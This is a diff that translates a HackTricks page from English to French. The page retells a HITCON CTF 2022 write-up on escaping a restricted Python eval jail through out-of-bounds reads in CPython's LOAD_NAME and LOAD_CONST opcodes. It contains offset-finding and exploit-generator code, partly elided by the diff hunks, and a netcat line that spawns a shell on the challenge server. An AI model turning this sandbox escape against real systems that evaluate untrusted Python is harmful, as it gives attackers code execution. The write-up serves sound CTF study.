@@ -4,43 +4,40 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-**This info was taken** [**from this writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
+**Ces informations ont été extraites** [**de ce writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-We can use OOB read feature in LOAD\_NAME / LOAD\_CONST opcode to get some symbol in the memory. Which means using trick like `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` to get a symbol (such as function name) you want.
+Nous pouvons utiliser la fonctionnalité de lecture OOB dans l'opcode LOAD\_NAME / LOAD\_CONST pour obtenir un symbole dans la mémoire. Cela signifie utiliser une astuce comme `(a, b, c, ... des centaines de symboles ..., __getattribute__) if [] else [].__getattribute__(...)` pour obtenir un symbole (comme le nom d'une fonction) que vous voulez.
 
-Then just craft your exploit.
+Ensuite, il suffit de créer votre exploit.
 
-### Overview <a href="#overview-1" id="overview-1"></a>
+### Aperçu <a href="#overview-1" id="overview-1"></a>
 
-The source code is pretty short, only contains 4 lines!
-
+Le code source est assez court, ne contenant que 4 lignes !
 ```python
 source = input('>>> ')
 if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))1234
 ```
+Vous pouvez entrer du code Python arbitraire, qui sera compilé en un [objet de code Python](https://docs.python.org/3/c-api/code.html). Cependant, `co_consts` et `co_names` de cet objet de code seront remplacés par un tuple vide avant l'évaluation de cet objet de code.
 
-You can input arbitrary Python code, and it'll be compiled to a [Python code object](https://docs.python.org/3/c-api/code.html). However `co_consts` and `co_names` of that code object will be replaced with an empty tuple before eval that code object.
+Ainsi, toutes les expressions contenant des constantes (par exemple, des nombres, des chaînes de caractères, etc.) ou des noms (par exemple, des variables, des fonctions) peuvent provoquer une violation de segmentation à la fin.
 
-So in this way, all the expression contains consts (e.g. numbers, strings etc.) or names (e.g. variables, functions) might cause segmentation fault in the end.
+### Lecture hors limites <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
-### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
+Comment se produit la violation de segmentation ?
 
-How does the segfault happen?
-
-Let's start with a simple example, `[a, b, c]` could compile into the following bytecode.
-
+Commençons par un exemple simple, `[a, b, c]` pourrait être compilé en le bytecode suivant.
 ```
   1           0 LOAD_NAME                0 (a)
               2 LOAD_NAME                1 (b)
@@ -48,13 +45,11 @@ Let's start with a simple example, `[a, b, c]` could compile into the following 
               6 BUILD_LIST               3
               8 RETURN_VALUE12345
 ```
+Mais que se passe-t-il si les `co_names` deviennent un tuple vide ? L'opcode `LOAD_NAME 2` est toujours exécuté et essaie de lire la valeur de cette adresse mémoire où elle devrait être. Oui, c'est une fonctionnalité de lecture hors limites.
 
-But what if the `co_names` become empty tuple? The `LOAD_NAME 2` opcode is still executed, and try to read value from that memory address it originally should be. Yes, this is an out-of-bound read "feature".
+Le concept clé de la solution est simple. Certains opcodes de CPython, tels que `LOAD_NAME` et `LOAD_CONST`, sont vulnérables (?) à la lecture hors limites.
 
-The core concept for the solution is simple. Some opcodes in CPython for example `LOAD_NAME` and `LOAD_CONST` are vulnerable (?) to OOB read.
-
-They retrieve an object from index `oparg` from the `consts` or `names` tuple (that's what `co_consts` and `co_names` named under the hood). We can refer to the following short snippest about `LOAD_CONST` to see what CPython does when it proccesses to `LOAD_CONST` opcode.
-
+Ils récupèrent un objet de l'index `oparg` du tuple `consts` ou `names` (c'est ce que `co_consts` et `co_names` sont nommés sous le capot). Nous pouvons nous référer au court extrait suivant sur `LOAD_CONST` pour voir ce que CPython fait lorsqu'il traite l'opcode `LOAD_CONST`.
 ```c
 case TARGET(LOAD_CONST): {
     PREDICTED(LOAD_CONST);
@@ -64,25 +59,21 @@ case TARGET(LOAD_CONST): {
     FAST_DISPATCH();
 }1234567
 ```
+De cette manière, nous pouvons utiliser la fonction OOB pour obtenir un "nom" à partir d'un décalage de mémoire arbitraire. Pour être sûr du nom et de son décalage, il suffit d'essayer `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Et vous pourriez trouver quelque chose à propos de oparg > 700. Vous pouvez également essayer d'utiliser gdb pour examiner la disposition de la mémoire, mais je ne pense pas que cela soit plus facile ?
 
-In this way we can use the OOB feature to get a "name" from arbitrary memory offset. To make sure what name it has and what's it's offset, just keep trying `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... And you could find something in about oparg > 700. You can also try to use gdb to take a look at the memory layout of course, but I don't think it would be more easier?
+### Génération de l'exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>
-
-Once we retrieve those useful offsets for names / consts, how _do_ we get a name / const from that offset and use it? Here is a trick for you:\
-Let's assume we can get a `__getattribute__` name from offset 5 (`LOAD_NAME 5`) with `co_names=()`, then just do the following stuff:
-
+Une fois que nous avons récupéré ces décalages utiles pour les noms / constantes, comment obtenir un nom / constante à partir de ce décalage et l'utiliser ? Voici un truc pour vous :\
+Supposons que nous puissions obtenir un nom `__getattribute__` à partir du décalage 5 (`LOAD_NAME 5`) avec `co_names=()`, il suffit de faire les choses suivantes :
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
     [].__getattribute__
     # you can get the __getattribute__ method of list object now!
 ]1234
 ```
+> Remarquez qu'il n'est pas nécessaire de le nommer `__getattribute__`, vous pouvez le nommer quelque chose de plus court ou de plus étrange.
 
-> Notice that it is not necessary to name it as `__getattribute__`, you can name it as something shorter or more weird
-
-You can understand the reason behind by just viewing it's bytecode:
-
+Vous pouvez comprendre la raison en regardant simplement son bytecode :
 ```python
               0 BUILD_LIST               0
               2 POP_JUMP_IF_FALSE       20
@@ -99,22 +90,20 @@ You can understand the reason behind by just viewing it's bytecode:
              24 BUILD_LIST               1
              26 RETURN_VALUE1234567891011121314
 ```
+Remarquez que `LOAD_ATTR` récupère également le nom de `co_names`. Python charge les noms à partir du même décalage si le nom est identique, donc le deuxième `__getattribute__` est toujours chargé à partir du décalage=5. En utilisant cette fonctionnalité, nous pouvons utiliser un nom arbitraire une fois que le nom est dans la mémoire à proximité.
 
-Notice that `LOAD_ATTR` also retrieve the name from `co_names`. Python loads names from the same offset if the name is the same, so the second `__getattribute__` is still loaded from offset=5. Using this feature we can use arbitrary name once the name is in the memory nearby.
+Pour générer des nombres, cela devrait être trivial :
 
-For generating numbers should be trivial:
-
-* 0: not \[\[]]
-* 1: not \[]
-* 2: (not \[]) + (not \[])
+* 0 : pas \[\[]]
+* 1 : pas \[]
+* 2 : (pas \[]) + (pas \[])
 * ...
 
-### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
+### Script d'exploitation <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-I didn't use consts due to the length limit.
+Je n'ai pas utilisé de constantes en raison de la limite de longueur.
 
-First here is a script for us to find those offsets of names.
-
+Tout d'abord, voici un script pour trouver les décalages de ces noms.
 ```python
 from types import CodeType
 from opcode import opmap
@@ -149,9 +138,7 @@ if __name__ == '__main__':
 
 # for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
 ```
-
-And the following is for generating the real Python exploit.
-
+Et ce qui suit est pour générer l'exploit Python réel.
 ```python
 import sys
 import unicodedata
@@ -228,9 +215,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-
-It basically does the following things, for those strings we get it from the `__dir__` method:
-
+Il fait essentiellement les choses suivantes, pour les chaînes que nous obtenons à partir de la méthode `__dir__`:
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -243,15 +228,14 @@ builtins = getattr(
 '__repr__').__getattribute__('__globals__')['builtins']
 builtins['eval'](builtins['input']())
 ```
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
